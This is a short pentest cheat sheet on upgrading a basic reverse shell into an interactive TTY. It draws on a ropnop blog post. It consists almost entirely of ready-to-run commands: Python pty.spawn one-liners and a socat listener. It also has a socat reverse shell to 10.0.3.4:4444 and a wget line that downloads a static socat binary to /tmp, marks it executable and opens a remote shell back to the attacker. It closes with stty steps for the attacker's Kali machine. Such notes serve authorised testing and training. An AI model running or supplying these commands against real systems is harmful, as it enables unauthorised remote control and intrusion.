# Python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Socat
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## wget Socat
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
>github source : https://github.com/andrew-d/static-binaries
>Make sure to get the correct architecture of socat if you are doing this

# stty options
```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```



Source :
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module

